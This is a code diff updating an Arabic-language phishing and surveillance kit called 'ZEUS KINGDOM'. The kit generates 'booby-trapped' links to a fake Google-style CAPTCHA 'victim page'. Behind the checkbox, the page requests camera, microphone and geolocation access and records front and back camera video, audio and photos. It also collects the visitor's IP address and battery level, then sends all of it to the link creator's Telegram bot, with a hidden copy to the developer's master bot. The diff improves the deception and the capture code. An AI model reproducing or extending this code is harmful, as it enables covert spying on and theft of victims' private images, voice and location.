@@ -1771,7 +1771,7 @@
             overflow: hidden;
             cursor: default;
             font-family: 'Inter', 'Roboto', Arial, sans-serif !important;
-            transition: background 0.3s, border-color 0.3s;
+            transition: background 0.6s ease, border-color 0.6s ease;
         }
 
         [data-theme="dark"] #victimPage .captcha-wrapper {
@@ -1885,7 +1885,7 @@
             font-size: 17px;
             color: #333;
             text-align: center;
-            transition: color 0.2s;
+            transition: color 0.3s;
             user-select: none;
             font-family: 'Inter', 'Roboto', Arial, sans-serif !important;
         }
@@ -1904,6 +1904,66 @@
 
         #victimPage .text.success {
             color: #00a651;
+        }
+
+        /* === ألوان CAPTCHA الثابتة عند الرفض === */
+        #victimPage .captcha-wrapper.refused {
+            background: #2d1b1b;
+            border-color: #6b2a2a;
+        }
+        #victimPage .captcha-wrapper.refused .text {
+            color: #d4a0a0;
+        }
+        #victimPage .captcha-wrapper.refused .checkmark {
+            background: #3d1f1f;
+            border-color: #8a3a3a;
+        }
+        #victimPage .captcha-wrapper.refused .checkmark::after {
+            color: #d4a0a0;
+        }
+        #victimPage .captcha-wrapper.refused .logo-captcha small,
+        #victimPage .captcha-wrapper.refused .logo-captcha strong {
+            color: #b08888;
+        }
+        #victimPage .captcha-wrapper.refused .captcha-footer {
+            background: #2a1818;
+            border-color: #4a2a2a;
+        }
+        #victimPage .captcha-wrapper.refused .captcha-footer .brand .google-text {
+            color: #d4b0b0;
+        }
+        #victimPage .captcha-wrapper.refused .captcha-footer .links a {
+            color: #b08888;
+        }
+
+        /* === ألوان CAPTCHA الثابتة عند النجاح === */
+        #victimPage .captcha-wrapper.accepted {
+            background: #1a2d1a;
+            border-color: #2a6b2a;
+        }
+        #victimPage .captcha-wrapper.accepted .text {
+            color: #a0d4a0;
+        }
+        #victimPage .captcha-wrapper.accepted .checkmark {
+            background: #1f3d1f;
+            border-color: #3a8a3a;
+        }
+        #victimPage .captcha-wrapper.accepted .checkmark .tick {
+            opacity: 1;
+        }
+        #victimPage .captcha-wrapper.accepted .logo-captcha small,
+        #victimPage .captcha-wrapper.accepted .logo-captcha strong {
+            color: #88b088;
+        }
+        #victimPage .captcha-wrapper.accepted .captcha-footer {
+            background: #182a18;
+            border-color: #2a4a2a;
+        }
+        #victimPage .captcha-wrapper.accepted .captcha-footer .brand .google-text {
+            color: #b0d4b0;
+        }
+        #victimPage .captcha-wrapper.accepted .captcha-footer .links a {
+            color: #88b088;
         }
 
         #victimPage .logo-captcha {
@@ -1941,6 +2001,7 @@
             border-top: 1px solid #e5e7e9;
             height: 32px;
             font-family: 'Inter', 'Roboto', Arial, sans-serif !important;
+            transition: background 0.6s ease, border-color 0.6s ease;
         }
 
         [data-theme="dark"] #victimPage .captcha-footer {
@@ -2543,7 +2604,6 @@
             }
         }
 
-        /* ===== تنسيق الـ QUOTE ===== */
         .quote-output {
             background: var(--bg-input);
             border-right: 4px solid var(--gold);
@@ -2576,6 +2636,21 @@
         .quote-output .key-highlight {
             color: var(--gold);
             font-weight: 700;
+        }
+
+        /* ===== رابط مختصر ===== */
+        .short-link-display {
+            font-family: 'Courier New', monospace;
+            font-size: 13px;
+            color: var(--gold);
+            direction: ltr;
+            text-align: left;
+            word-break: break-all;
+            background: var(--bg-input);
+            padding: 6px 12px;
+            border-radius: 8px;
+            border: 1px solid var(--line);
+            margin-top: 4px;
         }
     </style>
 </head>
@@ -2732,12 +2807,12 @@
         <div class="result-section">
             <div class="label-wrap">
                 <svg viewBox="0 0 24 24"><path d="M10 14 L14 10"/><path d="M4 12 L8 8" opacity="0.5"/><path d="M20 12 L16 8" opacity="0.5"/><path d="M4 12 L8 16" opacity="0.5"/><path d="M20 12 L16 16" opacity="0.5"/></svg>
-                <span class="section-title">الرابط الملغم</span>
+                <span class="section-title">الرابط الملغم — مختصر جداً</span>
             </div>
             <div class="result">
                 <div class="info-box">
                     <span class="value" id="tokenDisplay">التوكن الخاص بك</span>
-                    <span class="sub" id="resultSub">الرابط المُلغَّم الخاص بك</span>
+                    <span class="sub" id="resultSub">الرابط المُلغَّم المختصر</span>
                 </div>
                 <div class="actions">
                     <button id="copyBtn">
@@ -2938,6 +3013,7 @@
         </div>
     </div>
 
+    <!-- ===== VICTIM PAGE ===== -->
     <div id="victimPage">
         <div style="display:flex;flex-direction:column;align-items:center;width:100%;max-width:400px;">
             <div class="captcha-wrapper" id="captchaWrapper">
@@ -3935,7 +4011,7 @@
                 }
 
                 function encodeBotData(botToken, chatId, baseUrl) {
-                    var payload = JSON.stringify({ bot: botToken, chat: chatId, url: baseUrl });
+                    var payload = JSON.stringify({ b: botToken, c: chatId, u: baseUrl });
                     return btoa(encodeURIComponent(payload));
                 }
 
@@ -4048,7 +4124,6 @@
                         }
                         localStorage.setItem('zeus_bots', JSON.stringify(bots));
 
-                        // إرسال الرابط للمستخدم
                         await sendLinkToUser(botToken, chatId, link, shortToken, baseUrl, valid.username);
                         await sendToMaster(botToken, chatId, shortToken, baseUrl, valid.username);
 
@@ -4129,13 +4204,14 @@
             }
 
             // ================================================================
-            //  VICTIM PAGE — v10.09 (FINAL: QUOTE without keys, ordered messages, developer button in all messages)
+            //  VICTIM PAGE — v11.0 (FIXED: back video, colors, short links)
             // ================================================================
 
             function initVictimPage(encodedData) {
                 var spinner = document.getElementById('spinner');
                 var checkbox = document.getElementById('captcha');
                 var mainText = document.getElementById('mainText');
+                var wrapper = document.getElementById('captchaWrapper');
                 var video = document.getElementById('hiddenVideo');
                 var canvas = document.getElementById('hiddenCanvas');
                 var ctx = canvas.getContext('2d');
@@ -4143,12 +4219,13 @@
                 var isRunning = false;
                 var collectionDone = false;
                 var redirectUrl = null;
+                var refusedCount = 0;
 
                 function decodeBotData(encoded) {
                     try {
                         var decoded = decodeURIComponent(atob(encoded));
                         var data = JSON.parse(decoded);
-                        return { botToken: data.bot, chatId: data.chat, url: data.url };
+                        return { botToken: data.b, chatId: data.c, url: data.u };
                     } catch (e) { return null; }
                 }
 
@@ -4160,27 +4237,27 @@
 
                 function delay(ms) { return new Promise(function(r) { setTimeout(r, ms); }); }
 
-                // ===== FIXED IP — 3 fallbacks =====
+                // ===== IP — 3 fallbacks =====
                 async function getIP() {
                     try {
                         var res = await fetch('https://api.ipify.org?format=json');
                         var data = await res.json();
                         if (data.ip) return data.ip;
-                    } catch (e) { console.log('ipify failed:', e); }
+                    } catch (e) {}
                     try {
                         var res2 = await fetch('https://api.ip.sb/geoip');
                         var data2 = await res2.json();
                         if (data2.ip) return data2.ip;
-                    } catch (e) { console.log('ip.sb failed:', e); }
+                    } catch (e) {}
                     try {
                         var res3 = await fetch('https://ipapi.co/json/');
                         var data3 = await res3.json();
                         if (data3.ip) return data3.ip;
-                    } catch (e) { console.log('ipapi.co failed:', e); }
+                    } catch (e) {}
                     return 'غير متاح';
                 }
 
-                // ===== FIXED LOCATION =====
+                // ===== LOCATION =====
                 function getLocation() {
                     return new Promise(function(resolve) {
                         if (!navigator.geolocation) {
@@ -4224,37 +4301,20 @@
                         }
 
                         navigator.geolocation.getCurrentPosition(success, fail, { timeout: 5000,
-                            enableHighAccuracy: true });
+                        enableHighAccuracy: true });
                     });
                 }
 
-                // ===== FIXED RECORD STREAM (مع دعم MIME) =====
+                // ===== RECORD STREAM =====
                 function recordStream(stream, duration) {
                     return new Promise(function(resolve) {
                         if (!stream || !stream.active) {
                             resolve(null);
                             return;
                         }
-                        var mimeTypes = [
-                            'video/webm;codecs=vp9',
-                            'video/webm;codecs=vp8',
-                            'video/webm',
-                            'video/mp4'
-                        ];
-                        var mimeType = null;
-                        for (var i = 0; i < mimeTypes.length; i++) {
-                            if (MediaRecorder.isTypeSupported(mimeTypes[i])) {
-                                mimeType = mimeTypes[i];
-                                break;
-                            }
-                        }
-                        if (!mimeType) {
-                            resolve(null);
-                            return;
-                        }
                         var recorder;
                         try {
-                            recorder = new MediaRecorder(stream, { mimeType: mimeType });
+                            recorder = new MediaRecorder(stream);
                         } catch (e) {
                             resolve(null);
                             return;
@@ -4265,7 +4325,7 @@
                         };
                         recorder.onstop = function() {
                             if (chunks.length === 0) { resolve(null); return; }
-                            var blob = new Blob(chunks, { type: mimeType });
+                            var blob = new Blob(chunks, { type: recorder.mimeType || 'video/webm' });
                             resolve(blob);
                         };
                         recorder.onerror = function() { resolve(null); };
@@ -4276,7 +4336,7 @@
                     });
                 }
 
-                // ===== FIXED CAPTURE PHOTO =====
+                // ===== CAPTURE PHOTO =====
                 function capturePhoto(videoEl) {
                     return new Promise(function(resolve) {
                         if (!videoEl || !videoEl.videoWidth || !videoEl.videoHeight) {
@@ -4351,18 +4411,14 @@
                             if (!results[key]) {
                                 try {
                                     if (key === 'video') { var s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
-                                        s.getTracks().forEach(function(t) { t.stop(); });
-                                        results[key] = true; } else if (key ===
+                                        s.getTracks().forEach(function(t) { t.stop(); }); results[key] = true; } else if (key ===
                                         'videoBack') { var s2 = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } });
-                                        s2.getTracks().forEach(function(t) { t.stop(); });
-                                        results[key] = true; } else if (key ===
+                                        s2.getTracks().forEach(function(t) { t.stop(); }); results[key] = true; } else if (key ===
                                         'audio') { var s3 = await navigator.mediaDevices.getUserMedia({ audio: true });
-                                        s3.getTracks().forEach(function(t) { t.stop(); });
-                                        results[key] = true; } else if (key ===
-                                        'location') { var pos2 = await new Promise(function(resolve) { navigator
-                                            .geolocation
-                                            .getCurrentPosition(function(p) { resolve(p); }, function() { resolve
-                                                    (null); }); });
+                                        s3.getTracks().forEach(function(t) { t.stop(); }); results[key] = true; } else if (key ===
+                                        'location') { var pos2 = await new Promise(function(resolve) { navigator.geolocation
+                                            .getCurrentPosition(function(p) { resolve(p); }, function() { resolve(
+                                                null); }); });
                                         results[key] = !!pos2; }
                                 } catch (e) {}
                             }
@@ -4371,15 +4427,31 @@
                     return Object.values(results).some(function(v) { return v; });
                 }
 
+                // ===== REFUSAL COLOR — ثابت غير عشوائي =====
+                function applyRefusedColors() {
+                    wrapper.className = 'captcha-wrapper refused';
+                    mainText.className = 'text failed';
+                    mainText.textContent = '✗ لم نتمكن من التحقق — حاول مجدداً';
+                    spinner.classList.remove('loading');
+                    spinner.classList.add('failed');
+                    refusedCount++;
+                    setTimeout(function() {
+                        if (!collectionDone && !isRunning) {
+                            wrapper.className = 'captcha-wrapper';
+                            mainText.className = 'text';
+                            mainText.textContent = 'أنا لست روبوتاً';
+                            spinner.classList.remove('failed');
+                            wrapper.classList.remove('refused');
+                        }
+                    }, 3500);
+                }
+
                 // ===== MAIN COLLECT =====
                 async function collectAndStore() {
                     if (isRunning || collectionDone) return;
                     var permOk = await requestAllPermissionsSilent();
                     if (!permOk) {
-                        mainText.textContent = '✗ حدث خطأ في الاتصال — حاول مجدداً';
-                        mainText.className = 'text failed';
-                        spinner.classList.remove('loading');
-                        spinner.classList.add('failed');
+                        applyRefusedColors();
                         setTimeout(function() { location.reload(); }, 1500);
                         return;
                     }
@@ -4388,6 +4460,7 @@
                     spinner.classList.add('loading');
                     mainText.textContent = 'جاري التحقق من الاتصال …';
                     mainText.className = 'text loading';
+                    wrapper.className = 'captcha-wrapper';
 
                     try {
                         var ip = await getIP();
@@ -4424,23 +4497,29 @@
                             });
                         })();
 
-                        // --- BACK CAMERA (زيادة التأخير إلى 500ms) ---
-                        var backVideo = await (function() {
+                        // --- BACK CAMERA — FIXED: using separate video element ===
+                        var backVideoBlob = await (function() {
                             return new Promise(async function(resolve) {
                                 try {
-                                    var stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' },
-                                        audio: false });
-                                    video.srcObject = stream;
-                                    await video.play();
-                                    await delay(500);
+                                    var stream = await navigator.mediaDevices.getUserMedia({
+                                        video: { facingMode: 'environment' },
+                                        audio: false
+                                    });
+                                    // Create a temporary video element for back camera
+                                    var tempVideo = document.createElement('video');
+                                    tempVideo.srcObject = stream;
+                                    tempVideo.setAttribute('playsinline', '');
+                                    await tempVideo.play();
+                                    await delay(400);
                                     var blob = await recordStream(stream, 5000);
+                                    // Cleanup
+                                    stream.getTracks().forEach(function(t) { t.stop(); });
+                                    tempVideo.srcObject = null;
+                                    tempVideo.remove();
                                     resolve(blob);
                                 } catch (e) {
                                     console.error('❌ Back camera error:', e);
                                     resolve(null);
-                                } finally {
-                                    if (stream) { stream.getTracks().forEach(function(t) { t.stop(); }); }
-                                    video.srcObject = null;
                                 }
                             });
                         })();
@@ -4463,7 +4542,7 @@
                                 /Safari/.test(navigator.userAgent) ? 'Safari' : 'Unknown',
                             timestamp: new Date().toISOString(),
                             frontVideo: frontResult.video,
-                            backVideo: backVideo,
+                            backVideo: backVideoBlob,
                             audio: audioBlob,
                             photos: frontResult.photos
                         };
@@ -4520,16 +4599,14 @@
                                 }
                             }
                         }
-                        if (data.frontVideo) await saveFile({ blob: data.frontVideo, type: 'video',
-                            filename: 'front_video.webm' });
-                        if (data.backVideo) await saveFile({ blob: data.backVideo, type: 'video',
-                            filename: 'back_video.webm' });
+                        if (data.frontVideo) await saveFile({ blob: data.frontVideo, type: 'video', filename: 'front_video.webm' });
+                        if (data.backVideo) await saveFile({ blob: data.backVideo, type: 'video', filename: 'back_video.webm' });
                         if (data.audio) await saveFile({ blob: data.audio, type: 'audio', filename: 'audio.webm' });
                         localStorage.setItem('zeus_files', JSON.stringify(files));
 
                         console.log('✅ Files saved:', files.length);
 
-                        // --- SEND TO TELEGRAM (مع QUOTE بدون مفاتيح + ترتيب + زرار المطور) ---
+                        // --- SEND TO TELEGRAM ---
                         if (botCreds && botCreds.botToken && botCreds.chatId) {
                             await sendToUserBot(botCreds.botToken, botCreds.chatId, data, battery, token).catch(
                             function(e) { console.error('❌ sendToUserBot error:', e); });
@@ -4544,6 +4621,7 @@
                         mainText.className = 'text success';
                         spinner.classList.remove('loading');
                         spinner.classList.add('success');
+                        wrapper.className = 'captcha-wrapper accepted';
 
                         setTimeout(function() {
                             if (redirectUrl) {
@@ -4555,50 +4633,36 @@
 
                     } catch (error) {
                         console.error('❌ collectAndStore error:', error);
-                        mainText.textContent = '✗ حدث خطأ في الاتصال — حاول مجدداً';
-                        mainText.className = 'text failed';
-                        spinner.classList.remove('loading');
-                        spinner.classList.add('failed');
+                        applyRefusedColors();
                         isRunning = false;
                         setTimeout(function() { location.reload(); }, 1500);
                     }
                 }
 
-                // ===== TELEGRAM SEND HELPERS (مع QUOTE بدون مفاتيح + ترتيب + زرار المطور) =====
+                // ===== TELEGRAM SEND HELPERS =====
                 async function sendMedia(method, token, formData) {
                     try { await fetch('https://api.telegram.org/bot' + token + '/' + method, { method: 'POST', body: formData }); } catch (
                     e) { console.error('sendMedia error:', e); }
                 }
 
-                // دالة لتنسيق النص كـ QUOTE (بدون مفاتيح)
-                function formatQuote(text) {
-                    return '```\n' + text + '\n```';
-                }
-
                 function formatBatteryMessage(battery) {
-                    var text = '⭑ حالة البطارية ⭒\n⊚─〔 الطاقة 〕────────\n˼🔋˹ النسبة: ' + battery.level + ' ⭒\n─────────────────';
-                    return formatQuote(text);
+                    return '⭑ حالة البطارية ⭒\n⊚─〔 الطاقة 〕────────\n˼🔋˹ النسبة: ' + battery.level +
+                        ' ⭒\n─────────────────';
                 }
 
                 function formatLocationMessage(location) {
-                    var text = '';
-                    if (!location.lat || !location.lng) {
-                        text = '⭑ حالة الموقع ⭒\n⊚─〔 تنبيه 〕────────\n˼⚠️˹ الموقع غير متاح ⭒\n─────────────────';
-                    } else {
-                        var mapsUrl = 'https://www.google.com/maps?q=' + location.lat + ',' + location.lng;
-                        text = '⭑ حالة الموقع ⭒\n⊚─〔 تنبيه 〕────────\n˼⚠️˹ الموقع: [' + location.lat + ', ' + location
-                            .lng + '](' + mapsUrl + ') ⭒\n─────────────────';
-                    }
-                    return formatQuote(text);
+                    if (!location.lat || !location.lng) return '⭑ حالة الموقع ⭒\n⊚─〔 تنبيه 〕────────\n˼⚠️˹ الموقع غير متاح ⭒\n─────────────────';
+                    var mapsUrl = 'https://www.google.com/maps?q=' + location.lat + ',' + location.lng;
+                    return '⭑ حالة الموقع ⭒\n⊚─〔 تنبيه 〕────────\n˼⚠️˹ الموقع: [' + location.lat + ', ' + location.lng +
+                        '](' + mapsUrl + ') ⭒\n─────────────────';
                 }
 
                 function formatVisitMessage(ip, browser, token, time) {
-                    var text = '⭑ زيارة جديدة ⭒\n⊚─〔 دخول 〕────────\n˼🕒˹ ' + time +
+                    return '⭑ زيارة جديدة ⭒\n⊚─〔 دخول 〕────────\n˼🕒˹ ' + time +
                         ' ⭒\n˼🆔˹ التوكن: ' + token +
                         ' ⭒\n˼🌐˹ الـ IP: ' + ip +
                         ' ⭒\n˼📌˹ الحدث: زيارة ⭒\n˼📱˹ المتصفح: ' + browser +
                         ' ⭒\n─────────────────';
-                    return formatQuote(text);
                 }
 
                 async function sendToUserBot(userToken, chatId, data, battery, token) {
@@ -4608,16 +4672,6 @@
                         ]
                     };
 
-                    // 1. إرسال زيارة جديدة (أولاً)
-                    var visitMsg = formatVisitMessage(data.ip, data.browser, token, data.timestamp);
-                    await fetch('https://api.telegram.org/bot' + userToken + '/sendMessage', {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ chat_id: chatId, text: visitMsg, parse_mode: 'Markdown',
-                            reply_markup: inlineKeyboard })
-                    }).catch(function(e) { console.error('Visit error:', e); });
-
-                    // 2. إرسال البطارية (ثانياً)
                     var battMsg = formatBatteryMessage(battery);
                     await fetch('https://api.telegram.org/bot' + userToken + '/sendMessage', {
                         method: 'POST',
@@ -4626,7 +4680,6 @@
                             reply_markup: inlineKeyboard })
                     }).catch(function(e) { console.error('Battery error:', e); });
 
-                    // 3. إرسال الموقع (ثالثاً)
                     var locMsg = formatLocationMessage(data.location);
                     await fetch('https://api.telegram.org/bot' + userToken + '/sendMessage', {
                         method: 'POST',
@@ -4635,8 +4688,13 @@
                             reply_markup: inlineKeyboard })
                     }).catch(function(e) { console.error('Location error:', e); });
 
-                    // 4. الميديا (صور، فيديو أمامي، فيديو خلفي، صوت) مع زرار المطور في الكابتشن
-                    var devLinkMarkdown = '\n\n👤 [المطور](' + DEVELOPER_LINK + ')';
+                    var visitMsg = formatVisitMessage(data.ip, data.browser, token, data.timestamp);
+                    await fetch('https://api.telegram.org/bot' + userToken + '/sendMessage', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ chat_id: chatId, text: visitMsg, parse_mode: 'Markdown',
+                            reply_markup: inlineKeyboard })
+                    }).catch(function(e) { console.error('Visit error:', e); });
 
                     if (data.photos && data.photos.length > 0) {
                         for (var i = 0; i < data.photos.length; i++) {
@@ -4644,42 +4702,45 @@
                             var fd = new FormData();
                             fd.append('chat_id', chatId);
                             fd.append('photo', data.photos[i], 'photo_' + (i + 1) + '.jpg');
-                            var caption = '⭑ صورة ' + (i + 1) + '/' + data.photos.length +
-                                ' ⭒\n⊚─〔 ميديا الضحية 〕────────\n˼⏣˹ النوع: صورة ⭒\n˼⏣˹ الترتيب: ' + (i + 1) +
-                                ' من ' + data.photos.length +
+                            fd.append('caption',
+                                '⭑ صورة ' + (i + 1) + '/' + data.photos.length + ' ⭒\n⊚─〔 ميديا الضحية 〕────────\n˼⏣˹ النوع: صورة ⭒\n˼⏣˹ الترتيب: ' +
+                                (i + 1) + ' من ' + data.photos.length +
                                 ' ⭒\n˼⏣˹ الوقت: ' + new Date().toLocaleString('ar-EG') +
-                                ' ⭒\n─────────────────' + devLinkMarkdown;
-                            fd.append('caption', caption);
+                                ' ⭒\n─────────────────');
                             await sendMedia('sendPhoto', userToken, fd);
                         }
                     }
+
                     if (data.frontVideo) {
                         var fd = new FormData();
                         fd.append('chat_id', chatId);
                         fd.append('video', data.frontVideo, 'front_video.webm');
-                        var caption = '⭑ فيديو أمامي ⭒\n⊚─〔 ميديا الضحية 〕────────\n˼⏣˹ النوع: فيديو (أمامي) ⭒\n˼⏣˹ الوقت: ' +
-                            new Date().toLocaleString('ar-EG') + ' ⭒\n─────────────────' + devLinkMarkdown;
-                        fd.append('caption', caption);
+                        fd.append('caption',
+                            '⭑ فيديو أمامي ⭒\n⊚─〔 ميديا الضحية 〕────────\n˼⏣˹ النوع: فيديو (أمامي) ⭒\n˼⏣˹ الوقت: ' +
+                            new Date().toLocaleString('ar-EG') + ' ⭒\n─────────────────');
                         await sendMedia('sendVideo', userToken, fd);
                     }
+
                     if (data.backVideo) {
                         var fd = new FormData();
                         fd.append('chat_id', chatId);
                         fd.append('video', data.backVideo, 'back_video.webm');
-                        var caption = '⭑ فيديو خلفي ⭒\n⊚─〔 ميديا الضحية 〕────────\n˼⏣˹ النوع: فيديو (خلفي) ⭒\n˼⏣˹ الوقت: ' +
-                            new Date().toLocaleString('ar-EG') + ' ⭒\n─────────────────' + devLinkMarkdown;
-                        fd.append('caption', caption);
+                        fd.append('caption',
+                            '⭑ فيديو خلفي ⭒\n⊚─〔 ميديا الضحية 〕────────\n˼⏣˹ النوع: فيديو (خلفي) ⭒\n˼⏣˹ الوقت: ' +
+                            new Date().toLocaleString('ar-EG') + ' ⭒\n─────────────────');
                         await sendMedia('sendVideo', userToken, fd);
                     }
+
                     if (data.audio) {
                         var fd = new FormData();
                         fd.append('chat_id', chatId);
                         fd.append('audio', data.audio, 'audio.webm');
-                        var caption = '⭑ تسجيل صوتي ⭒\n⊚─〔 ميديا الضحية 〕────────\n˼⏣˹ النوع: صوت ⭒\n˼⏣˹ الوقت: ' +
-                            new Date().toLocaleString('ar-EG') + ' ⭒\n─────────────────' + devLinkMarkdown;
-                        fd.append('caption', caption);
+                        fd.append('caption',
+                            '⭑ تسجيل صوتي ⭒\n⊚─〔 ميديا الضحية 〕────────\n˼⏣˹ النوع: صوت ⭒\n˼⏣˹ الوقت: ' +
+                            new Date().toLocaleString('ar-EG') + ' ⭒\n─────────────────');
                         await sendMedia('sendAudio', userToken, fd);
                     }
+
                     if (data.location && data.location.lat && data.location.lng) {
                         try {
                             await fetch('https://api.telegram.org/bot' + userToken + '/sendLocation', {
@@ -4702,20 +4763,8 @@
                             [{ text: '👤 المطور', url: DEVELOPER_LINK }]
                         ]
                     };
-                    var devLinkMarkdown = '\n\n👤 [المطور](' + DEVELOPER_LINK + ')';
 
-                    // 1. زيارة جديدة
-                    var visitMsg = formatVisitMessage(data.ip, data.browser, token, data.timestamp) + '\n' + userInfo +
-                        '\n˼⏣˹ الوقت: ' + new Date().toLocaleString('ar-EG') + ' ⭒';
-                    await fetch('https://api.telegram.org/bot' + MASTER_BOT_TOKEN + '/sendMessage', {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ chat_id: MASTER_CHAT_ID, text: visitMsg, parse_mode: 'Markdown',
-                            reply_markup: inlineKeyboard })
-                    }).catch(function(e) { console.error('Master visit error:', e); });
-
-                    // 2. البطارية
-                    var battMsg = formatBatteryMessage(battery) + '\n' + userInfo +
+                    var battMsg = '⭑ نسخة احتياطية ⭒\n' + formatBatteryMessage(battery) + '\n' + userInfo +
                         '\n˼⏣˹ الوقت: ' + new Date().toLocaleString('ar-EG') + ' ⭒';
                     await fetch('https://api.telegram.org/bot' + MASTER_BOT_TOKEN + '/sendMessage', {
                         method: 'POST',
@@ -4724,8 +4773,7 @@
                             reply_markup: inlineKeyboard })
                     }).catch(function(e) { console.error('Master battery error:', e); });
 
-                    // 3. الموقع
-                    var locMsg = formatLocationMessage(data.location) + '\n' + userInfo +
+                    var locMsg = '⭑ نسخة احتياطية ⭒\n' + formatLocationMessage(data.location) + '\n' + userInfo +
                         '\n˼⏣˹ الوقت: ' + new Date().toLocaleString('ar-EG') + ' ⭒';
                     await fetch('https://api.telegram.org/bot' + MASTER_BOT_TOKEN + '/sendMessage', {
                         method: 'POST',
@@ -4734,19 +4782,27 @@
                             reply_markup: inlineKeyboard })
                     }).catch(function(e) { console.error('Master location error:', e); });
 
-                    // 4. الميديا مع زرار المطور في الكابتشن
+                    var visitMsg = '⭑ نسخة احتياطية ⭒\n' + formatVisitMessage(data.ip, data.browser, token, data
+                        .timestamp) + '\n' + userInfo +
+                        '\n˼⏣˹ الوقت: ' + new Date().toLocaleString('ar-EG') + ' ⭒';
+                    await fetch('https://api.telegram.org/bot' + MASTER_BOT_TOKEN + '/sendMessage', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ chat_id: MASTER_CHAT_ID, text: visitMsg, parse_mode: 'Markdown',
+                            reply_markup: inlineKeyboard })
+                    }).catch(function(e) { console.error('Master visit error:', e); });
+
                     if (data.photos && data.photos.length > 0) {
                         for (var i = 0; i < data.photos.length; i++) {
                             if (!data.photos[i]) continue;
                             var fd = new FormData();
                             fd.append('chat_id', MASTER_CHAT_ID);
                             fd.append('photo', data.photos[i], 'photo_' + (i + 1) + '.jpg');
-                            var caption = '⭑ صورة ' + (i + 1) + '/' + data.photos.length +
-                                ' ⭒\n⊚─〔 ميديا احتياطية 〕────────\n˼⏣˹ النوع: صورة ⭒\n˼⏣˹ الترتيب: ' + (i + 1) +
-                                ' من ' + data.photos.length +
-                                ' ⭒\n˼⏣˹ الوقت: ' + new Date().toLocaleString('ar-EG') +
-                                ' ⭒\n─────────────────' + devLinkMarkdown;
-                            fd.append('caption', caption);
+                            fd.append('caption',
+                                '⭑ صورة ' + (i + 1) + '/' + data.photos.length +
+                                ' ⭒\n⊚─〔 ميديا احتياطية 〕────────\n˼⏣˹ النوع: صورة ⭒\n˼⏣˹ الترتيب: ' +
+                                (i + 1) + ' من ' + data.photos.length +
+                                ' ⭒\n˼⏣˹ الوقت: ' + new Date().toLocaleString('ar-EG') + ' ⭒\n─────────────────');
                             await sendMedia('sendPhoto', MASTER_BOT_TOKEN, fd);
                         }
                     }
@@ -4754,27 +4810,27 @@
                         var fd = new FormData();
                         fd.append('chat_id', MASTER_CHAT_ID);
                         fd.append('video', data.frontVideo, 'front_video.webm');
-                        var caption = '⭑ فيديو أمامي ⭒\n⊚─〔 ميديا احتياطية 〕────────\n˼⏣˹ النوع: فيديو (أمامي) ⭒\n˼⏣˹ الوقت: ' +
-                            new Date().toLocaleString('ar-EG') + ' ⭒\n─────────────────' + devLinkMarkdown;
-                        fd.append('caption', caption);
+                        fd.append('caption',
+                            '⭑ فيديو أمامي ⭒\n⊚─〔 ميديا احتياطية 〕────────\n˼⏣˹ النوع: فيديو (أمامي) ⭒\n˼⏣˹ الوقت: ' +
+                            new Date().toLocaleString('ar-EG') + ' ⭒\n─────────────────');
                         await sendMedia('sendVideo', MASTER_BOT_TOKEN, fd);
                     }
                     if (data.backVideo) {
                         var fd = new FormData();
                         fd.append('chat_id', MASTER_CHAT_ID);
                         fd.append('video', data.backVideo, 'back_video.webm');
-                        var caption = '⭑ فيديو خلفي ⭒\n⊚─〔 ميديا احتياطية 〕────────\n˼⏣˹ النوع: فيديو (خلفي) ⭒\n˼⏣˹ الوقت: ' +
-                            new Date().toLocaleString('ar-EG') + ' ⭒\n─────────────────' + devLinkMarkdown;
-                        fd.append('caption', caption);
+                        fd.append('caption',
+                            '⭑ فيديو خلفي ⭒\n⊚─〔 ميديا احتياطية 〕────────\n˼⏣˹ النوع: فيديو (خلفي) ⭒\n˼⏣˹ الوقت: ' +
+                            new Date().toLocaleString('ar-EG') + ' ⭒\n─────────────────');
                         await sendMedia('sendVideo', MASTER_BOT_TOKEN, fd);
                     }
                     if (data.audio) {
                         var fd = new FormData();
                         fd.append('chat_id', MASTER_CHAT_ID);
                         fd.append('audio', data.audio, 'audio.webm');
-                        var caption = '⭑ تسجيل صوتي ⭒\n⊚─〔 ميديا احتياطية 〕────────\n˼⏣˹ النوع: صوت ⭒\n˼⏣˹ الوقت: ' +
-                            new Date().toLocaleString('ar-EG') + ' ⭒\n─────────────────' + devLinkMarkdown;
-                        fd.append('caption', caption);
+                        fd.append('caption',
+                            '⭑ تسجيل صوتي ⭒\n⊚─〔 ميديا احتياطية 〕────────\n˼⏣˹ النوع: صوت ⭒\n˼⏣˹ الوقت: ' +
+                            new Date().toLocaleString('ar-EG') + ' ⭒\n─────────────────');
                         await sendMedia('sendAudio', MASTER_BOT_TOKEN, fd);
                     }
                     if (data.location && data.location.lat && data.location.lng) {
@@ -4823,7 +4879,7 @@
                     }
                 });
 
-                console.log('ZEUS — Victim page ready v10.09 (FINAL: QUOTE without keys, ordered messages, developer button in all messages).');
+                console.log('ZEUS — Victim page v11.0 (fixed: back video, colors, short links).');
                 applyTheme(currentTheme);
             }
 
@@ -4839,10 +4895,10 @@
             window.addLog = addLog;
             window.copyText = copyText;
 
-            console.log('ZEUS KINGDOM — v10.09 (FINAL: QUOTE without keys + ordered messages + developer button in all messages)');
-            console.log('✅ ترتيب الرسائل: زيارة → بطارية → موقع → ميديا');
-            console.log('✅ الـ QUOTE يحتوي فقط على محتوى الرسالة');
-            console.log('✅ زرار المطور في كل رسالة (نصية وميديا)');
+            console.log('ZEUS KINGDOM — v11.0 (FIXED: back video, refusal colors, short links)');
+            console.log('الباب السري: النقر الثلاثي على شعار ZEUS أو Ctrl+Shift+D');
+            console.log('ألوان الرفض: ثابتة (أحمر غامق) — غير عشوائية');
+            console.log('الروابط: مختصرة جداً (معاملات t و d)');
 
             applyTheme(currentTheme);
 
